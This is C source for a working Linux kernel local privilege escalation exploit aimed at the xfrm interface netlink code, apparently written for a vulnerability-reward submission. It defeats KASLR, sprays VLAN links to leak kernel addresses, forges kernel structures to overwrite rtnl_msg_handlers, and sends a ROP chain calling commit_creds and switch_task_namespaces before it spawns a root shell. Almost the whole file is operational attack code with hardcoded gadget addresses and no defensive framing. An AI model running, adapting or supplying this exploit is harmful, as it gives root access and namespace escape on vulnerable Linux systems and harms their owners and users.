#define _GNU_SOURCE
#include <features.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <errno.h>
#include <ctype.h>
#include <netdb.h>

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/sysinfo.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <netlink/msg.h>
#include <netlink/attr.h>
#include <netlink/netlink.h>
#include <sys/sysinfo.h>

#include "vlan_netlink.h"
#include "xfrm_netlink.h"
#include "gen.h"
#include "leak.h"

#define NETDEV_PRIV 0x940 //the offset in function netdev_priv

#define OFFSET_XFRM_IF_DEV 0x8 //offset(struct xfrm_if, dev)
#define OFFSET_XFRM_IF_NET 0x10 //offset(struct xfrm_if, net)
#define OFFSET_XFRM_IF_P_LINKID_AND_P_IFID 0x18 //offset (struct xfrm_if, p.link)
#define OFFSET_XFRM_IF_P_COLLECT_MD 0x20 //offset (struct xfrm_if, p.collect_md)
#define OFFSET_NET_GEN 0xaa8 //offset(struct net, gen)
#define TEST1_ID 0x10
#define TEST2_ID 0x101
#define TEST3_ID 0x102
#define TEST4_ID 0x103
#define TEST5_ID 0x104

#define ADDR_OF_RTNL_MSG_HANDLERS 0xFFFFFFFF84BAB040 //address of rtnl_msg_handlers
#define XFRMI_NET_ID_VALUE 0x2b //value of xfrmi_net_id, get it from debugging
#define HASH_OF_TEST1_ID 0x1c // the value of xfrmi_hash(TEST1_ID), get it from debugging
#define SIZEOF_ROP 0x100
#define FIRST_GADGET 0xffffffff81321cc8 //leave ; pop rbx ; pop rbp ; mov eax, ecx ; pop r12 ; pop r13 ; ret
#define POP_RDI_RET 0xffffffff8102932b //pop rdi ; ret
#define INIT_CRED 0xffffffff83c72ec0 //init_cred
#define COMMIT_CREDS 0xffffffff811fc260 //commit_creds
#define FIND_TASK_BY_VPID 0xffffffff811efe60 //find_task_by_vpid
#define OR_RDI_RAX_RET 0xffffffff81981535 //or rdi, rax ; test rdi, rdi ; setne al ; ret
#define POP_RSI_RET 0xffffffff811593be //pop rsi ; ret
#define INIT_NSPROXY 0xffffffff83c729e0 //init_nsproxy
#define SWITCH_TASK_NAMESPACES 0xffffffff811f9f60 // switch_task_namespaces
#define SWAPGS_RET 0xffffffff82468036 //swapgs; ret
#define IRETQ 0xFFFFFFFF826011B7 //iretq

int error_num = 0;

unsigned long user_cs,user_ss,user_rsp,user_rflags;

void shell(void) {
        printf("ret2usr success! uid : %d\n",getuid());
        char *args[] = {"/bin/sh", "-i", NULL};
        execve(args[0], args, NULL);
}

static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rsp),"=r" (user_rflags) : : "memory");
}


int nl_callback_get_error_num(struct nl_msg* recv_msg, void* arg)
{

    struct nlmsghdr * ret_hdr = nlmsg_hdr(recv_msg);

    if (ret_hdr->nlmsg_type == NLMSG_ERROR) {
	struct nlmsgerr *errmsg = nlmsg_data(ret_hdr);
	error_num = errmsg->error;
        return NL_STOP;
    }
}

static int clr_flag(char *ifname, short flag)
{
        struct ifreq ifr;
        int fd,skfd;

        /* Create a channel to the NET kernel. */
        if ((skfd = socket(AF_INET,SOCK_DGRAM ,0)) < 0) {
                perror("socket");
                exit(1);
        }

        fd = skfd;

        strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
        if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
                fprintf(stderr, "%s: unknown interface: %s\n",
                                ifname, strerror(errno));
                return -1;
        }
        strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
        if(flag == 1)
                ifr.ifr_flags &= ~IFF_UP;
        else if(flag == 2)
                ifr.ifr_flags |= IFF_UP;
        if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
                perror("SIOCSIFFLAGS");
                return -1;
        }
        return (0);
}

int setup_sandbox(void) {
  
  if (unshare(CLONE_NEWUSER) < 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    return -1;
  }
  
  if (unshare(CLONE_NEWNET) < 0) {
    perror("[-] unshare(CLONE_NEWNET)");
    return -1;
  }
  
}
void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
  usleep(1000);
}

int main(void) {
    save_state();
    pin_on_cpu(0);
    if (setup_sandbox() < 0){
        printf("Create sandbox fail!\n");
        return 0;
    }

    clr_flag("lo",2);
    
    //Step 1
    uint64_t kernel_off = bypass_kaslr(0);
    uint64_t base = bypass_kaslr2(0);
    printf("Step 1 finish ! %llx %llx\n", kernel_off, base);
    
    
    struct nl_sock * socket = nl_socket_alloc();

    if(nl_connect(socket,NETLINK_ROUTE)<0){
    		printf("nfnl_connect fail!\n");
		return 0;
    }
    //Step 2	
    create_xfrm_link_collect(socket, "test1");
    change_xfrm_link(socket, "test1", TEST1_ID);
    
    create_xfrm_link_with_ifid(socket, "test2", TEST2_ID);
    create_xfrm_link_with_ifid(socket, "test3", TEST3_ID);
    create_xfrm_link_with_ifid(socket, "test4", TEST4_ID);
    create_xfrm_link_with_ifid(socket, "test5", TEST5_ID);
    //Step 3
    delete_xfrm_link(socket, "test1");
    //sleep(1);
    
    //Step 4
    for (int i = 0; i < 0x1000; i++){
	char vlan_name[20];
    	pin_on_cpu(i%2);
	snprintf(vlan_name,20,"vlan%d",i);
	create_vlan_link(socket, vlan_name, 12, i);
    }

    pin_on_cpu(0);
    #ifdef KASLR_BYPASS_INTEL
    //for online environment
        uint64_t offset = 0;
    #else
    //for PR check
        uint64_t offset = 0x100000000;
    #endif
    base = 0xffff888100000000;
    offset = 0;
    uint64_t address_of_test2_dev = 0;
    uint64_t address_of_test3_dev = 0;
    uint64_t address_of_test4_dev = 0;
    nl_socket_modify_cb(socket,NL_CB_MSG_IN, NL_CB_CUSTOM, nl_callback_get_error_num, NULL);
    //find the address of `test2`->dev by error number because of the difference between -EEXIST and -EINVAL
    for (int i = 0; i < 0x10000; i++){
	for(int j = 0; j < 0x1000; j++){
	    char vlan_name[20];
            snprintf(vlan_name,20,"vlan%d",j);	    
	    change_vlan_link_for_leak(socket, vlan_name, base + offset + i*0x1000);
	}
	if(address_of_test2_dev==0){
		change_xfrm_link(socket, "test2", TEST1_ID);
		nl_recvmsgs_default(socket);
	
		if(error_num==-EINVAL){//if the error number is -EINVAL, it means we get the correct address of `test2`->dev
			address_of_test2_dev = base + offset + i*0x1000;
			printf("Get address of test2 dev : %llx\n", address_of_test2_dev);
			if(address_of_test3_dev!=0&&address_of_test4_dev!=0)
				break;
		}
	}
	
	if(address_of_test3_dev==0){
		change_xfrm_link(socket, "test3", TEST1_ID);
                nl_recvmsgs_default(socket);

                if(error_num==-EINVAL){//if the error number is -EINVAL, it means we get the correct address of `test2`->dev
                        address_of_test3_dev = base + offset + i*0x1000;
                        printf("Get address of test3 dev : %llx\n", address_of_test3_dev);
                        change_xfrm_link(socket, "test3", TEST3_ID);
			if(address_of_test2_dev!=0&&address_of_test4_dev!=0)
                                break;
                }
	}
	if(address_of_test4_dev==0){
                change_xfrm_link(socket, "test4", TEST1_ID);
                nl_recvmsgs_default(socket);

                if(error_num==-EINVAL){//if the error number is -EINVAL, it means we get the correct address of `test2`->dev
                        address_of_test4_dev = base + offset + i*0x1000;
                        printf("Get address of test4 dev : %llx\n", address_of_test4_dev);
                        change_xfrm_link(socket, "test4", TEST4_ID);
                        if(address_of_test2_dev!=0&&address_of_test3_dev!=0)
                                break;
                }
        }
	
    }
    
    
    if(address_of_test2_dev==0||address_of_test3_dev==0||address_of_test4_dev==0){
    	printf("Get address of test2 dev fail.\n");
	exit(0);
    }
    
    //Step 5
    delete_xfrm_link(socket, "test3");
    sleep(1);
    for (int i = 0x10; i < 0x20; i++){
        char vlan_name[20];
        pin_on_cpu(i%2);
        snprintf(vlan_name,20,"vlan%d",i);
        create_vlan_link(socket, vlan_name, 11, i); // the test4 -> if_index is 11 after debugging.
    }
    pin_on_cpu(0);
    
    for (int i = 0x10; i < 0x20; i++){
        char vlan_name[20];
        snprintf(vlan_name,20,"vlan%d",i);
        change_vlan_link_for_fake_net(socket, vlan_name, 
			address_of_test3_dev + 0x950 - 8*XFRMI_NET_ID_VALUE, //fake addr1, the net->gen ptr. Finally we get xfrmn from *(fake_addr1 + 8 * 0x2b). We build : *(fake_addr1 + 8 * 0x2b) == the address  of addr2. get 0x950 by debug
    			ADDR_OF_RTNL_MSG_HANDLERS + kernel_off + 8 - HASH_OF_TEST1_ID * 8); //fake addr2, fake struct xfrmi_net ptr, why 0xFFFFFFFF84BAB040 + off + 8 - 0x1c * 8? Because the address of &rtnl_msg_handlers[8] = 0xFFFFFFFF84BAB040 + 8 , and the hash of the (0x10) is 0x1c. So after setting this, we will finally overwrite the &rtnl_msg_handlers[8].
    }
     
    //Step 6
    for(int j = 0; j < 0x10; j++){
        char vlan_name[20];
        snprintf(vlan_name,20,"vlan%d",j);
        change_vlan_link_for_overwrite(socket, vlan_name, 
			address_of_test2_dev,    //fake xi->dev
			address_of_test3_dev + NETDEV_PRIV + OFFSET_XFRM_IF_DEV - OFFSET_NET_GEN + 8, //+ 0x948 - 0xaa0, //fake xi->net, 
			0x10 //fake xi->p.if_id
			);
    }
    //Step 7
    change_xfrm_link(socket, "test2", TEST1_ID);
    //Step 8
    //Now we try to build a fake rtnl_msg_handlers[1]
    for (int i = 0; i < 0x10; i++){
    	char vlan_name[20];
        snprintf(vlan_name,20,"vlan%d",i);
	change_vlan_link_for_leak(socket, vlan_name,address_of_test3_dev + NETDEV_PRIV + OFFSET_XFRM_IF_DEV);//rtnl_msg_handlers[1][1]
    }
    
    for (int i = 0x10; i < 0x20; i++){
        char vlan_name[20];
        snprintf(vlan_name,20,"vlan%d",i);
        change_vlan_link_for_fake_rtnl_link(socket, vlan_name, FIRST_GADGET + kernel_off);//rtnl_msg_handlers[1][1]->doit, 
											       //0xffffffff81321cc8 : leave ; pop rbx ; pop rbp ; mov eax, ecx ; pop r12 ; pop r13 ; ret
    }
    //Step 9
    //Now we try to control RIP and jump to ROP
    struct nl_msg * msg = nlmsg_alloc();
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            1 + 16,   // TYPE, 1
            sizeof(struct ifinfomsg) + SIZEOF_ROP,
            NLM_F_REQUEST
    );
    struct ifinfomsg * h = malloc(sizeof(struct ifinfomsg) + SIZEOF_ROP);
    memset(h, 0, sizeof(struct ifinfomsg));
    h->ifi_family = 1;
    char * ops = &h[1];
    //Now we pad ROPgadget
    *(uint64_t *)&ops[0x08] = kernel_off + POP_RDI_RET;//pop rdi; ret
    *(uint64_t *)&ops[0x10] = kernel_off + INIT_CRED;//init_cred
    *(uint64_t *)&ops[0x18] = kernel_off + COMMIT_CREDS;//commit_creds;
    *(uint64_t *)&ops[0x20] = kernel_off + POP_RDI_RET;//pop rdi ; ret
    *(uint64_t *)&ops[0x28] = 1;//rdi
    *(uint64_t *)&ops[0x30] = kernel_off + FIND_TASK_BY_VPID;//find_task_by_vpid
    *(uint64_t *)&ops[0x38] = kernel_off + POP_RDI_RET;//pop rdi; ret
    *(uint64_t *)&ops[0x40] = 0;//rdi
    *(uint64_t *)&ops[0x48] = kernel_off + OR_RDI_RAX_RET;//or rdi, rax ; test rdi, rdi ; setne al ; ret
    *(uint64_t *)&ops[0x50] = kernel_off + POP_RSI_RET;//pop rsi ; ret
    *(uint64_t *)&ops[0x58] = kernel_off + INIT_NSPROXY;//init_nsproxy
    *(uint64_t *)&ops[0x60] = kernel_off + SWITCH_TASK_NAMESPACES; //switch_task_namespaces
    *(uint64_t *)&ops[0x68] = kernel_off + SWAPGS_RET;//swagpgs; ret
    *(uint64_t *)&ops[0x70] = kernel_off + IRETQ;//iretq
    *(uint64_t *)&ops[0x78] = (uint64_t)shell;
    *(uint64_t *)&ops[0x80] = user_cs;
    *(uint64_t *)&ops[0x88] = user_rflags;
    *(uint64_t *)&ops[0x90] = user_rsp;//|8;
    *(uint64_t *)&ops[0x98] = user_ss;
    
    memcpy(nlmsg_data(hdr1), h, sizeof(struct ifinfomsg) + 0x100);
    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len);
    char *buf = malloc(total_size);
    memset(buf,0,total_size);
    memcpy(buf,hdr1,NLMSG_ALIGN(hdr1->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    
    return 0;
}
